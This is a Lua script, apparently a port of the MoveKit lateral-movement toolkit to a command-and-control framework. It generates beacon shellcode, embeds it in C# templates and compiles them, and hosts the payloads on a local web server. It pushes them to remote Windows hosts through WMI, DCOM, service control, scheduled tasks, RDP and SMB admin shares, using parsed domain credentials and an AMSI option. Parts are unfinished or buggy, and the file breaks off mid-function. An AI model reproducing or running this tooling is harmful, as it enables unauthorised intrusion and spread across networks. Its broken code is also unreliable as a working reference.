--[[
https://github.com/0xthirteen/MoveKit
]]
local strings = require("strings")
local regexp = require("regexp")
local inspect = require("inspect")
local time = require("time")
local MoveKit = {}

MoveKit.movedefaults = {
    droptype = "WMI",
    cmdtrigger = "WMI",
    location = "",
    file = "",
    droplocation = "C:\\Windows\\Temp",
    filename = "moveme.exe",
    eventname = "Debug",
    auto = true,
    x86 = false,
    amsi = false,
    staged = false,
    shellcodeformat = "base64",
    -- findstring = '$$PAYLOAD$$'
    findstring = "%$%$PAYLOAD%$%$"
}
-- 参数预检查
function MoveKit.prechecks(...)
    local args = { ... }
    local bid, listener, descname, help, drptype, plocation, cname, dropn, cmdtrig, customfile, auto

    if help == 'Help' then
        if ismatch(descname, '.*-Command.*') then
            helpMenus.cmdhelpmenu(descname)
        else
            helpMenus.filehelpmenu(descname)
        end
    end

    if not bid then
        error("Session ID is required")
    end
    if drptype == "WMI" and plocation == "" then
        error(
            "Error: The 'Location' for WMI file drop was left empty, please enter a valid URL, Windows path, or Linux path")
    end
    descname_match = ismatch(descname, ".*-Command.*")
    if descname_match ~= nil and plocation == "" then
        error(
            "Error: A location is required for command lateral movement")
    end
    if cname == "" then
        error("Error: Specify a host to move to")
    end
    if dropn == "" and auto ~= "true" then
        error("Error: Error: A file name is required")
    end
    if desname == "PreBuiltCustom Lateral Movement" and customfile == "" and auto == "true" then
        error("Error: Custom Prebuilt file execution requires specify file (local)")
    end
    if cmdtrig == "RDP" then
        if file_exists(script_resource("MoveKit/Assemblies/SharpRDP.exe")) then
            error("Error: The SharpRDP assembly is required for this command trigger type")
        end
    else
        if file_exists(script_resource("MoveKit/Assemblies/SharpMove.exe")) then
            error("Error: The SharpMove assembly is required for this command trigger type")
        end
    end

    -- 其他检查逻辑...
end

-- 构建文件命令
function MoveKit.filecmdbuilder(...)
    local args = { ... }
    local creds, lateralarg, location, droplocation, filename, eventname, computername, credential, command, amsi, cmdtrgr, dropmthd
    creds = ""
    lateralarg = {};
    location = args[1];
    droplocation = args[2];
    filename = args[3];
    eventname = args[4];
    computername = args[5];
    credential = args[6];
    command = args[7];
    amsi = args[8];
    cmdtrgr = args[9];
    dropmthd = args[10];

    if cmdtrgr == "WMI" then
        table.insert(lateralarg, 'action=create')
    elseif cmdtrgr == "SCHTASK" then
        table.insert(lateralarg, 'action=taskscheduler ')
    elseif strings.has_prefix(cmdtrgr, "DCOM") then
        trig = strings.split(cmdtrgr, " ")[1]
        mthd = strings.split(cmdtrgr, " ")[2]
        table.insert(lateralarg, 'action=dcom')
        table.insert(lateralarg, "method=" .. mthd)
    elseif cmdtrgr == "SCM" then
        table.insert(lateralarg, 'action=scm')
    elseif cmdtrgr == "ModifyService" then
        table.insert(lateralarg, 'action=modsvc')
    elseif cmdtrgr == "ModifySchTask" then
        table.insert(lateralarg, 'action=modschtask')
    end

    if cmdtrgr ~= "" then
        table.insert(lateralarg, "computername=" .. computername)
    end

    if command ~= "" then
        table.insert(lateralarg, "command=" .. command)
    end

    if eventname ~= "" and cmdtrgr == "SCHTASK" then
        table.insert(lateralarg, "taskname=" .. eventname)
    end

    if eventname ~= "" and cmdtrgr == "SCM" then
        table.insert(lateralarg, "servicename=" .. eventname)
    end

    if eventname ~= "" and cmdtrgr == "ModifyService" then
        table.insert(lateralarg, "servicename=" .. eventname)
    end

    if eventname ~= "" and cmdtrgr == "ModifySchTask" then
        table.insert(lateralarg, "taskname=" .. eventname)
    end

    if amsi then
        table.insert(lateralarg, "amsi=true")
    end

    if credential ~= "" then
        local domain_and_username,password = MoveKit.credentialparser(credential)
        table.insert(lateralarg, "username=" .. domain_and_username)
        table.insert(lateralarg, "password=" .. password)
    end
    return lateralarg
end

-- 构建进程命令
function MoveKit.proccmdbuilder(...)
    local args = { ... }
    local creds, lateralarg, command, computername, credential, cmdtrgr, event, amsi, cred,mthd,trig
    creds = ""
    lateralarg = {}
    command = args[1]
    computername = args[2]
    credential = args[3]
    cmdtrgr = args[4]
    eventname = args[5]
    amsi = args[6]

    if cmdtrgr == "WMI" then
        table.insert(lateralarg, "action=create")
    elseif cmdtrgr == "SCHTASK" then
        table.insert(lateralarg, "action=taskscheduler")
    elseif cmdtrgr ~= nil and strings.has_prefix(cmdtrgr, "DCOM") then
        trig = strings.split(cmdtrgr, " ")[1]
        mthd = strings.split(cmdtrgr, " ")[2]
        table.insert(lateralarg, 'action=dcom')
        table.insert(lateralarg, "method=" .. mthd)
    elseif cmdtrgr == "SCM" then
        table.insert(lateralarg, 'action=scm')
    elseif cmdtrgr == "ModifyService" then
        table.insert(lateralarg, 'action=modsvc')
    elseif cmdtrgr == "ModifySchTask" then
        table.insert(lateralarg, 'action=modschtask')
    end

    if cmdtrgr ~= "" then
        table.insert(lateralarg, "computername=" .. computername)
    end

    if command ~= "" and command ~= nil then
        table.insert(lateralarg, "command=" .. command .. "")
    end

    if eventname ~= "" and cmdtrgr == "SCHTASK" then
        table.insert(lateralarg, "taskname=" .. eventname)
    end

    if eventname ~= "" and cmdtrgr == "SCM" then
        table.insert(lateralarg, "servicename=" .. eventname)
    end

    if eventname ~= "" and cmdtrgr == "ModifyService" then
        table.insert(lateralarg, "servicename=" .. eventname)
    end

    if eventname ~= "" and cmdtrgr == "ModifySchTask" then
        table.insert(lateralarg, "taskname=" .. eventname)
    end

    if amsi then
        table.insert(lateralarg, "amsi=true")
    end

    if credential ~= "" then
        local domain_and_username,password = MoveKit.credentialparser(credential)
        table.insert(lateralarg, "username=" .. domain_and_username)
        table.insert(lateralarg, "password=" .. password)
    end
    return lateralarg
end

-- 解析凭据
function MoveKit.credentialparser(cred_str)
    -- 格式: domain\user:password 或 user:password
    local domain, username, password, rest

        -- 检查是否包含反斜杠（\）
    if string.find(cred_str, "\\") then
        -- 包含反斜杠，提取域名和剩余部分
        domain, rest = string.match(cred_str, "([^\\]+)\\(.+)")
    else
        -- 不包含反斜杠，直接提取用户名和密码
        domain = nil
        rest = cred_str
    end

    -- 提取用户名和密码（假设最后一个空格之后的部分是密码）
    local last_space_pos = string.find(rest, "%s[^ ]+$")
    if last_space_pos then
        username = string.sub(rest, 1, last_space_pos - 1)
        password = string.sub(rest, last_space_pos + 1)
    else
        error("Error: Invalid credentials format. Password not found.")
    end

    local domain_username
    if domain then
        domain_username = string.format("%s\\%s", domain, username)
        -- result = string.format("username=\"%s\\%s\" password=\"%s\"", domain,user, password)
    else
        domain_username = string.format("%s", username)
        -- result = string.format("username=\"%s\" password=\"%s\"", user, password)
    end
    -- print(domain_username)
    -- print(password)
    return domain_username,password
end

function MoveKit.buildassembly(...)
    local args = { ... }
    local basesixty, session, pldata, monotest, testres, handle2, smidata, fp, savelocation, bltasm, handl3, interop, buildasm, assembly_size
    pldata = args[1]
    session = active()
    basesixty = base64_encode(pldata)
    -- monotest = exec("which mcs") -- 获取Mono路径,用于编译后续C#代码
    -- testres = readAll(monotest)
    -- if testres == "@()" then
    --     error(
    --         "It appears that Mono is not installed on the target machine.You will not be able to build assemblies without it")
    -- end
    print("[+]building FileWrite.cs")
    local file_write_path = script_resource("MoveKit/Assemblies/FileWrite.cs")
    local file_write_handle = io.open(file_write_path, "rb")
    if not file_write_handle then error("Failed to open " .. file_write_path) end
    local swmidata = file_write_handle:read("*all")
    file_write_handle:close()
    local replace_swmidata = string.gsub(swmidata, "LOADLOADLOAD", basesixty)
    local save_location = script_resource("MoveKit/Assemblies/dynamic-build.cs")
    bltasm = script_resource("MoveKit/Assemblies/dfw.exe")
    local f = io.open(save_location, "w")
    if not f then error("Failed to open " .. save_location) end
    f:write(replace_swmidata)
    f:close()
    buildasm = io.popen("mcs /reference:System.Management -out:" .. bltasm .. " " .. save_location)
    if not buildasm then error("Failed to compile " .. prebuild) end
    local datax = buildasm:read("*a")
    buildasm:close()
    print(datax)
end

function MoveKit.compilepl(...)
    local args = { ... }
    local cmpdata, prebuild, cmpledfl, handle4, buildcpled, handle, sourcepay, desc, refs, templ, archi, platf, saveas, cmplrtest, testres
    sourcepay = args[1]
    desc = args[2]
    templ = args[3]
    arch = args[4]
    refs = ""
    -- cmplrtest = os.exec("which mcs");
    -- testres = readAll(cmplrtest)
    -- if testres == "@()" then
    --     error(
    --         "It appears that Mono is not installed on the target machine.You will not be able to build assemblies without it")
    -- end
    local is_match_custom, is_match_install, err
    is_match_install , err = regexp.match("^InstallUtil.*", desc)
    if err then error(err) end
    is_match_custom , err = regexp.match("^NonPreBuiltCustom.*", desc)
    if err then error(err) end
    is_match_shellcode , err = regexp.match("^Shellcode-.*", desc)
    if err then error(err) end

    if is_match_install then
        saveas = script_resource("MoveKit/Templates/InstallUtil.exe");
        refs = "/reference:System.Configuration.Install"
    elseif is_match_custom then
        saveas = script_resource("MoveKit/Templates/CustomNonPre.exe");
        if templ:match('^service-.*') then
            refs = "/reference:System.ServiceProcess"
        end
    elseif is_match_shellcode then
        saveas = script_resource("MoveKit/Assemblies/ExcelDCOM.exe")
    end

    if arch == "x86" or arch == "x32" then
        platf = "-platform:x86"
    elseif arch == "x64" then
        platf = "-platform:x64"
    end
    prebuild = script_resource("MoveKit/Templates/TempPreCompileFile.cs")
    local f = io.open(prebuild, "w")
    if not f then error("Failed to open " .. prebuild) end
    f:write(sourcepay)
    f:close()
    -- print(platf)
    -- print(refs)
    -- print(saveas)
    -- print(prebuild)
    buildcpled = io.popen("mcs " .. platf .. " " .. refs .. " -out:" .. saveas .. " " .. prebuild)
    if not buildcpled then error("Failed to compile " .. prebuild) end
    local datax = buildcpled:read("*a")
    buildcpled:close()
    if is_match_shellcode then
        os.remove(prebuild)
        return;
    else
        cmpledfl = io.open(saveas, "r")
        if not cmpledfl then error("Failed to open " .. saveas) end
        cmpdata = cmpledfl:read("*all")
        cmpledfl:close()
        -- deleteFile(saveas)
        os.remove(prebuild)
        return cmpdata
    end

    return datax
end

function MoveKit.fwargbuilder(...)
    local args = { ... }
    local ops, creds, ops, lateralarg -- 不确定是否要global
    creds = "";
    lateralarg = {};
    ops = args[1];

    -- File movement types - SMB will be done in CS rather than the assembly
    if ops["droptype"] == "WMI" then
        table.insert(lateralarg, 'writetype=wmi')
    end
    if ops["computername"] ~= "" then
        table.insert(lateralarg,"computername="..ops["computername"])
    end
    if ops["location"] ~= "" and ops["location"] ~= nil then
        local location_result,err = regexp.match('^(/[^/ ]*)+/?$', ops["location"])
        if err then error(err) end
        if location_result or ops["location"] == "local" then
            table.insert(lateralarg, 'location=local')
        else
            table.insert(lateralarg, 'location="' .. ops["location"] .. '"')
        end
    end
    if ops["droplocation"] ~= "" and ops["droplocation"] ~= nil then
        table.insert(lateralarg, 'droplocation="' .. ops["droplocation"] .. '"')
    end
    if ops["filename"] ~= "" and ops["filename"] ~= nil then
        table.insert(lateralarg, 'filename="' .. ops["filename"] .. '"')
    end
    if ops["eventname"] ~= "" and ops["eventname"] ~= nil then
        table.insert(lateralarg, 'eventname="' .. ops["eventname"] .. '"');
    end
    if ops["credential"] ~= "" and ops["credential"] ~= nil then
        local domain_and_username,password = MoveKit.credentialparser(ops["credential"]);
        table.insert(lateralarg, 'username="' .. domain_and_username .. '"');
        table.insert(lateralarg, 'password="' .. password .. '"');
    end
    return lateralarg;
end

function MoveKit.filelocator(...)
    local args = { ... }
    local bid, flocation, desc, hostedfile, fname, hostloc
    bid = args[1];
    flocation = args[2];
    desc = args[3];
    hostedfile = args[4];
    fname = args[5];
    local file_match, err = regexp.match('^\\w:\\.*', flocation)
    if err then error(err) end
    local session = active()
    if file_match then
        beacupload = flocation .. "\\" .. fname;
        uploadraw(session, flocation, hostedfile, "0644", false)
        -- while bupload_raw(bid, flocation, hostedfile) do
        -- 	pause(bid, 1000);
        -- end
    else
        local url_regex = '(^https?://)([^:/]+)(?::(\\d+))?(/.*)?'
        http_match, err = regexp.find_all_string_submatch(url_regex, flocation)
        if err then error(err) end
        local host,url,proto,port,path
        url, proto, host, port, path= unpack(http_match[1])

        local website_name = "website4movekit"
        local website_root = "/"
        local website_host = "0.0.0.0"
        local website_listener = "listener"
        local certPath = ""
        local keyPath = ""
        local use_ssl = false
        if proto=="http://" then
            if port=="" then
                port = 80
            else
                port = tonumber(port)
            end
            if path=="" then
                path = "/"
            end
            use_ssl = false
        elseif proto=="https://" then
            if port=="" then
                port = 443
            else
                port = tonumber(port)
            end
            if path=="" then
                path = "/"
            end
            use_ssl = true
        else
            error("Error: Could not detect a URL")
        end
        website_new(website_name,website_root,website_host,tonumber(port),use_ssl,certPath,keyPath,website_listener)
        website_start(website_name)
        webcontent_add("bin:"..base64_encode(hostedfile),path,website_name,"")
    end
end

-- 生成并托管payload
function MoveKit.makeplandhost(...)
    local args = { ... }
    local plarch, pltype, descname, shcode, finshellc, outpl, data, finalpayload, uris, hostloc,template, sharpasm, taskargs, fwargs, gen
    local shellcode ,final_shellcode
    gen = args[1];
    pltype = args[2];
    descname = args[3];
    template = args[4];
    sharpasm = args[5];
    taskargs = args[6];
    plarch = "x86";
    if gen['x86'] == false then
        plarch = "x64"
    end
    local session = active()
    if gen['staged'] == false then
        shellcode = self_stager(session)
    else
        shellcode = self_artifact(session)
    end
    final_shellcode = base64_encode(shellcode)
    outpl = io.open(script_resource("MoveKit/Templates/" .. template))
    if not outpl then
        error("Error: Could not open file ".. template)
    end
    data = outpl:read("*all")
    outpl:close()
    finalpayload = string.gsub(data, MoveKit.movedefaults["findstring"], final_shellcode)
    local http_match , https_match,err
    -- 匹配 HTTP 协议
    local url_regex = '(^https?://)([^:/]+)(?::(\\d+))?(/.*)?'
    http_match, err = regexp.find_all_string_submatch(url_regex, gen['location'])
    if err then error(err) end
    local host,url,proto,port,path
    url, proto, host, port, path= unpack(http_match[1])

    local website_name = "website4movekit"
    local website_root = "/"
    local website_host = "0.0.0.0"
    local website_listener = "listener"
    local certPath = ""
    local keyPath = ""
    local use_ssl = false
    if proto=="http://" then
        if port=="" then
            port = 80
        else
            port = tonumber(port)
        end
        if path=="" then
            path = "/"
        end
        use_ssl = false
    elseif proto=="https://" then
        if port=="" then
            port = 443
        else
            port = tonumber(port)
        end
        if path=="" then
            path = "/"
        end
        use_ssl = true
    else
        error("Error: Could not detect a URL")
    end
    website_new(website_name,website_root,website_host,tonumber(port),use_ssl,certPath,keyPath,website_listener)
    website_start(website_name)
    webcontent_add("bin:"..base64_encode(finalpayload),path,website_name,"")
    MoveKit.execprep(gen, sharpasm, taskargs, descname)
end

-- payload构建器
function MoveKit.payloadbuilder(...)
    local shcode, pltype, template, description, taskargs, droppedpath, compileit, plarch, finshellc, noncompiled, outpl, data, finalpayload, sharpasm, fwargs, fwbin, gen
    local final_shellcode
    local args = { ... }
    gen = args[1]
    pltype = args[2]
    template = args[3]
    description = args[4]
    taskargs = args[5]
    droppedpath = args[6]
    compileit = args[7]
    sharpasm = args[8]
    fwargs = args[9]
    fwbin = args[10]
    plarch = "x86"
    if gen['x86'] == false then
        plarch = "x64"
    end
    local session = active()
    if gen['staged'] == false then
        shellcode = self_stager(session)
        final_shellcode = shellcode
    else
        final_shellcode = self_artifact(session)
    end
    outpl = io.open(script_resource("MoveKit/Templates/" .. template))
    if not outpl then
        error("Error: Could not open file ".. template)
    end
    data = outpl:read("*all")
    outpl:close()
    -- base64 final_shellcode
    final_shellcode = base64_encode(final_shellcode)
    noncompiled = string.gsub(data, MoveKit.movedefaults["findstring"], final_shellcode)
    if compileit == true then
        finalpayload = MoveKit.compilepl(noncompiled, description, template, plarch)
    else
        finalpayload = noncompiled
    end
    if gen['droptype'] == "WMI" then
        local result_match , err = regexp.match('^(/[^/ ]*)+/?$', gen['location'])
        if err then error(err) end
        if result_match or gen['location'] == "local" then
            MoveKit.buildassembly(finalpayload, gen['filename'])
        else
            MoveKit.filelocator(gen['bid'], gen['location'], description, finalpayload, gen['filename'])
        end
    end
    MoveKit.filewrite(nil, gen['computername'], droppedpath, gen['filename'], finalpayload, gen['droptype'],
        fwargs)
end

-- 自定义处理器
function MoveKit.customhandler(...)
    local args = { ... }
    local data, handle, sharptask, descname, sharpasm, extinfo, fwargs
    sharptask = args[2]
    descname = args[3]
    fwargs = args[4]
    sharpasm = "Assemblies/SharpMove.exe"

    if args[1]['cmdtrigger'] == "RDP" then
        sharpasm = "Assemblies/SharpRDP.exe"
    end
    if args[1]['auto'] == "true" then
        filehandle = io.open(args[1]['file'], "r")
        data = filehandle:read("*all")
        filehandle:close()
        if args[1]['droptype'] == "WMI" then
            if args[1]['location']:match("^(/[^/ ]*)+/?$") or args[1]['location'] == "local" then
                MoveKit.buildassembly(data, args[1]['bid'])
            else
                MoveKit.filelocator(args[1]['bid'], args[1]['location'], descname, data, args[1]['filename'])
            end
        end
        args2filewrite = { args[1]['bid'], args[1]['computername'], args[1]['droplocation'], args[1]['filename'], data,
            args[1]['droptype'], fwargs }
        MoveKit.filewrite(args2filewrite)
    end
    extinfo = args[1]['cmdtrigger'] .. " command trigger and " .. args[1]['droptype'] .. " file write"
    MoveKit.taskexec(args[1]['bid'], sharptask, descname, extinfo)
end

function MoveKit.execprep(...)
    local sharpasm, sharptask, descname, extinfo, ltype, list
    local args = { ... }
    sharpasm = args[2]
    sharptask = args[3]
    descname = args[4]
    -- list = args[1]['listener']
    -- ltype = listener_describe(args[1]['listener'])
    -- binput(args[1]['bid'], "MoveKit " .. descname)
    -- if args[1]['auto'] == "true" then
    --     if ismatch(descname, ".*-Command.*") then
    --         extinfo = "with " .. args[1]['cmdtrigger'] .. " command trigger and located at " .. args[1]['location']
    --     else
    --         extinfo = "with " .. args[1]['cmdtrigger'] .. " command trigger and " .. args[1]['droptype'] .. " file write"
    --     end
    --     print(args[1]['bid'], "Listener info  -  " .. list .. " - " .. ltype)
    -- else
    --     extinfo = "with " .. args[1]['cmdtrigger'] .. " command trigger and "
    -- end
    -- MoveKit.taskexec(args[1]['bid'], sharptask, descname, extinfo) -- todo
    MoveKit.taskexec(nil,sharpasm, sharptask, descname, extinfo)
    -- if args[1]['x86'] == "true" then
    --     larch = "x86"
    -- else
    --     larch = "x64"
    -- end
    -- todo函数
    --   if ltype:match("beacon_bind_pipe") then
    --       if args[1]['staged'] == "true" then
    -- 	beacon_stage_pipe(args[1]['bid'], args[1]['computername'], args[1]['listener'], larch);
    -- end
    -- -- pause(args[1]['bid'], 5000);
    -- -- blink(args[1]['bid'], args[1]['computername']);
    -- beacon_link(args[1]['bid'], args[1]['computername'], args[1]['listener']); -- todo
    --   elseif ltype:match("beacon_bind_tcp") then
    --       if args[1]['staged'] == "true" then
    -- 	-- bstage(); todo
    -- 	-- beacon_stage_tcp(args[1]['bid'], args[1]['computername'], 1234, ,args[1]['listener'], larch);
    -- end
    -- -- bpause($1['bid'], 5000);
    -- -- bconnect($1['bid'], $1['computername']);
    -- -- beacon_link($1['bid'], $1['computername'], $1['listener']);
    --   end
end

function MoveKit.taskexec(...)
    local args = { ... }
    local bid, sharpasm, sharptask, desc_type, extras
    -- bid = args[1]
    bid = active()
    sharpasm = args[2]
    sharpasm = "MoveKit/" .. sharpasm
    sharptask = args[3]
    desc_type = args[4]
    extras = args[5]
    session = active()
    -- print(script_resource(sharpasm))
    -- print(sharptask)
    return execute_assembly(session, script_resource(sharpasm), sharptask, true, new_sac())
end

function MoveKit.filewrite(...)
    local bid, target, dlocation, filename, payl, drive, path, upload, writetype, fwargs, exec,x
    local args = { ... }
    bid = active()
    target = args[2]
    dlocation = args[3]
    filename = args[4]
    payl = args[5]
    writetype = args[6]
    fwargs = args[7]
    x = "true"
    -- (drive, path) = split(':', dlocation)
    local drive, path = unpack(strings.split(':', dlocation))
    if writetype == "WMI" then
        execute_assembly(bid, script_resource("MoveKit/Assemblies/dfw.exe"), fwargs, true, new_sac());
    elseif writetype == "SMB" then
        local drive_ismatch, err = regexp.match("[a-zA-Z]", drive)
        if err then error(err) end
        if drive_ismatch then
            drive = drive .. '$'
        else
            drive = 'C$'
        end
        print("unimplemented")
        -- uploadraw(bid, "\\\\" .. target .. "\\" .. drive .. path .. "\\" .. filename, payl)
    end
end
-- moveKit::bearings
function MoveKit.bearings(...)
    local args = { ... }
    local sharptask, drplocation, bid, latcommand, payloadtype, compile, descname, exectemplate, fwargs, fwbin,sharpasm
    local params = args[1]
    sharptask = ""
    latcommand = args[2]
    payloadtype = args[3]
    compile = args[4]
    descname = args[5]
    exectemplate = args[6]

    fwbin = "Assemblies/dfw.exe"
    sharpasm = "Assemblies/SharpMove.exe"

    if params["cmdtrigger"] == "RDP" then
        sharpasm = "Assemblies/SharpRDP.exe"
    end
    -- local droplocation_regx ,err = regexp.match('.*\\$', params["droplocation"])
    if params["droplocation"] ~= nil then
        local droplocation_result, err = regexp.find_all_string_submatch('.*\\$', params["droplocation"])
        if err then error(err) end
        if droplocation_result ~= nil and droplocation_result[1] ~= nil and droplocation_result[1][2] ~= nil then
            drplocation = string.gsub(droplocation_result[1][2],'\\$',"")
        else
            drplocation = params["droplocation"]
        end
    end
    -- 生成.netduiying对应的args
    fwargs = MoveKit.fwargbuilder(params)
    if params["droptype"] == "WMI" then
        sharptask = MoveKit.filecmdbuilder(
            params["location"],
            drplocation,
            params["filename"],
            params["eventname"],
            params["computername"],
            params["credential"],
            latcommand,
            params["amsi"],
            params["cmdtrigger"],
            params["droptype"]
        )
    else
        sharptask = MoveKit.proccmdbuilder(
            latcommand,
            params["computername"],
            params["credential"],
            params["cmdtrigger"],
            params["eventname"],
            params["amsi"]
        )
    end
    local descname_match , err
    descname_match, err = regexp.match('^Shellcode-.*', descname)
    if err then error(err) end
    -- 根据描述名称处理不同的执行路径
    if descname == "PreBuiltCustom Lateral Movement" then
        MoveKit.customhandler(params, sharptask, descname, fwargs)
    elseif descname_match then
        MoveKit.shellconly(params, sharptask, descname)
    else
        if params.auto == true then
            descname_match, err = regexp.match(".*-Command.*", descname)
            if err then error(err) end
            if descname_match then
                print("[+] makeplandhost")
                MoveKit.makeplandhost(params, payloadtype, descname, exectemplate, sharpasm, sharptask)
            else
                print("[+] payloadbuilder")
                MoveKit.payloadbuilder(
                    params,
                    payloadtype,
                    exectemplate,
                    descname,
                    sharptask,
                    drplocation,
                    compile,
                    sharpasm,
                    fwargs,
                    fwbin
                )
            end
        else
            MoveKit.execprep(params, sharpasm, sharptask, descname)
        end
    end
end

function MoveKit.shellconly(...)
    local args = { ... }
    local ops, task, sharpasm, pltype, desc, plarch, shcode, finshellc, outpl, data
    ops = args[1]
    task = args[2]
    desc = args[3]
    pltype = "raw"
    sharpasm = "Assemblies/ExcelDCOM.exe"
    plarch = "x86"
    local session = active()
    if ops['x86'] == false then
        plarch = "x64"
    end
    if ops['staged'] == false then
        shellcode = self_stager(session)
        final_shellcode = shellcode
    else
        final_shellcode = self_artifact(session)
    end
    outpl = io.open(script_resource("MoveKit/Assemblies/ExcelDCOM.cs"))
    if not outpl then
        error("Error: Could not open file Assemblies/ExcelDCOM.cs")
    end
    data = outpl:read("*all")
    outpl:close()
    final_shellcode = base64_encode(final_shellcode)
    noncompiled = string.gsub(data, MoveKit.movedefaults["findstring"], final_shellcode)
    MoveKit.compilepl(noncompiled, desc, "", plarch)
    MoveKit.execprep(ops, sharpasm, task, desc)
end

function MoveKit.writeonlyhandler(...)
    local args = { ... }
    local gen, bid, writeargs, plarch, shcode, finalpayload,final_shellcode,shellcode
    gen = args[1]
    writeargs = args[2];
    bid = gen['bid']
    -- 不确定
    filename = gen['filename'];
    dlocation = gen['droplocation'];
    target = gen['computername'];
    if gen['x86'] == false then
        plarch = "x64"
    else
        plarch = "x86"
    end
    if gen['staged'] == false then
        shellcode = self_stager(session)
        final_shellcode = shellcode
    else
        final_shellcode = self_artifact(session)
    end
    if gen['template'] ~= "" then
        local outpl = io.open(gen['template'])
        if not outpl then
            error("Error: Could not open file ".. gen['template'])
        end
        local data = outpl:read("*all")
        outpl:close()
        final_shellcode = base64_encode(final_shellcode)
        noncompiled = string.gsub(data, MoveKit.movedefaults["findstring"], final_shellcode)
        if gen['compileit'] == "true" then
            finalpayload = MoveKit.compilepl(noncompiled, gen['description'], gen['template'], plarch)
        else
            finalpayload = noncompiled
        end
    else
        finalpayload = final_shellcode
    end
    if gen['file'] ~= "" then
        local outpl = io.open(gen['file'])
        if not outpl then
            error("Error: Could not open file ".. gen['file'])
        end
        local data = outpl:read("*all")
        outpl:close()
        if gen['b64file'] == "true" then
            finalpayload = base64_encode(data)
        else
            finalpayload = data
        end
    end
    -- regexp.match(regexp, data)
    local writetype_ismatch_wmi, writetype_ismatch_smb, err
    writetype_ismatch_wmi, err = regexp.match("^WMI.*", gen['writetype'])
    if err then error(err) end
    if writetype_ismatch_wmi then
        local location_ismatch, err = regexp.match('^(/[^/ ]*)+/?$', gen['location'])
        if err then error(err) end
        if location_ismatch or gen['location'] == "local" then
            MoveKit.buildassembly(finalpayload, bid)
        else
            MoveKit.filelocator(bid, gen['location'], gen['description'], finalpayload, gen['filename'])
        end
    end
    local drive,path
    drive, path = strings.split(':', gen['droplocation'])
    writetype_ismatch_smb, err = regexp.match("^SMB.*", gen['writetype'])
    if err then error(err) end
    if writetype_ismatch_wmi then
        -- print(bid,"" .. dstamp(ticks()) .. " - Writing " .. filename .. " to " .. dlocation .. " on " .. target .. " via WMI")
        execute_assembly(session, script_resource("MoveKit/Assemblies/dfw.exe"), writeargs, true, new_sac())
        time.sleep(8)
        -- pause(bid, 8000)
        return
    elseif writetype_ismatch_smb then
        local drive_ismatch, err = regexp.match("[a-zA-Z]", drive)
        if err then error(err) end
        if drive_ismatch then
            drive = drive .. '\\$'
        else
            drive = 'C\\$'
        end
        print(bid,"" .. dstamp(ticks()) .. " - Writing " .. filename .. " to " .. dlocation .. " on " .. target .. " via SMB")
        uploadraw(bid, finalpayload, "\\\\" .. target .. "\\" .. drive .. path .. "\\" .. filename, "0644", false)
        return;
    end
end

function MoveKit.writeonlybuilder(...)
    local args = { ... }
    local xx, writeargs
    xx = args
    writeargs = {}
    if xx['writetype'] == "WMI_to_file" then
        table.insert(writeargs, 'writetype=wmi')
    elseif xx['writetype'] == "WMI_to_Regisry" then
        table.insert(writeargs, 'writetype=registry')
    elseif xx['writetype'] == "WMI_to_New_WMIClass" then
        table.insert(writeargs,'writetype=wmiclass')
    end

    if xx['computername'] ~= "" then
        table.insert(writeargs, 'computername='.. xx['computername'])
    end
    if xx['eventname'] ~= "" then
        table.insert(writeargs, 'eventname='.. xx['eventname'])
    end
    if xx['location'] ~= "" then
        table.insert(writeargs, 'location="'.. xx['location'].. '"')
    end
    if xx['droplocation'] ~= "" then
        table.insert(writeargs, 'droplocation="'.. xx['droplocation'].. '"')
    end
    if xx['filename'] ~= "" then
        table.insert(writeargs, 'filename="'.. xx['filename'].. '"')
    end
    if xx['wnamespace'] ~= "" then
        table.insert(writeargs, 'wnamespace="'.. xx['wnamespace'].. '"')
    end
    if xx['valuename'] ~= "" then
        table.insert(writeargs, 'valuename="'.. xx['valuename'].. '"')
    end
    if xx['reglocation'] ~= "" then
        table.insert(writeargs, 'reglocation="'.. xx['reglocation'].. '"')
    end
    if xx['classname'] ~= "" then
        table.insert(writeargs, 'classname="'.. xx['classname'].. '"')
    end
    if xx['credential'] ~= "" then
        local domain_and_username , password = MoveKit.credentialparser(xx['credential'])
        table.insert(writeargs, 'username='.. domain_and_username)
        table.insert(writeargs, 'password='.. password)
    end

    MoveKit.writeonlyhandler(xx, writeargs)
end

-- 执行准备


-- WMI执行
function MoveKit.exec_wmi(params, sharptask, sharpasm)
    local args = bof_pack("z", sharptask)
    beacon_bof_execute(params.bid, sharpasm, args)
end

-- RDP执行
function MoveKit.exec_rdp(params, sharptask, sharpasm)
    -- 添加RDP特定参数
    if not string.match(sharptask, "exec=") then
        sharptask = sharptask .. " exec=Win+R"
    end
    local args = bof_pack("z", sharptask)
    beacon_bof_execute(params.bid, sharpasm, args)
end

-- SCM执行
function MoveKit.exec_scm(params, sharptask, sharpasm)
    -- 添加服务名称
    if params.eventname == "" then
        params.eventname = "MoveService" .. os.time()
    end
    sharptask = sharptask .. string.format(" servicename=%s", params.eventname)
    local args = bof_pack("z", sharptask)
    beacon_bof_execute(params.bid, sharpasm, args)
end

-- 计划任务执行
function MoveKit.exec_schtask(params, sharptask, sharpasm)
    -- 添加任务名称
    if params.eventname == "" then
        params.eventname = "MoveTask" .. os.time()
    end
    sharptask = sharptask .. string.format(" taskname=%s", params.eventname)
    local args = bof_pack("z", sharptask)
    beacon_bof_execute(params.bid, sharpasm, args)
end

-- 修改计划任务执行
function MoveKit.exec_modify_schtask(params, sharptask, sharpasm)
    if params.eventname == "" then
        error("Task name is required for ModifySchTask")
    end
    sharptask = sharptask .. string.format(" taskname=%s", params.eventname)
    local args = bof_pack("z", sharptask)
    beacon_bof_execute(params.bid, sharpasm, args)
end

-- 修改服务执行
function MoveKit.exec_modify_service(params, sharptask, sharpasm)
    if params.eventname == "" then
        error("Service name is required for ModifyService")
    end
    sharptask = sharptask .. string.format(" servicename=%s", params.eventname)
    local args = bof_pack("z", sharptask)
    beacon_bof_execute(params.bid, sharpasm, args)
end

-- DCOM执行
function MoveKit.exec_dcom(params, sharptask, sharpasm)
    -- 从cmdtrigger中提取DCOM方法
    local dcom_method = string.match(params.cmdtrigger, "DCOM%s+(.+)")
    if not dcom_method then
        error("Invalid DCOM method")
    end

    sharptask = sharptask .. string.format(" method=%s", dcom_method)
    local args = bof_pack("z", sharptask)
    beacon_bof_execute(params.bid, sharpasm, args)
end

-- WMI事件处理
function MoveKit.handle_wmi_event(params, shellcode, sharptask)
    -- 生成WMI事件订阅代码
    local content = payloadgen.generate_wmi_event(shellcode, params)

    -- 写入临时文件
    local temp_file = os.tmpname()
    local f = io.open(temp_file, "w")
    f:write(content)
    f:close()

    -- 执行WMI事件订阅
    local args = bof_pack("zz", temp_file, params.computername)
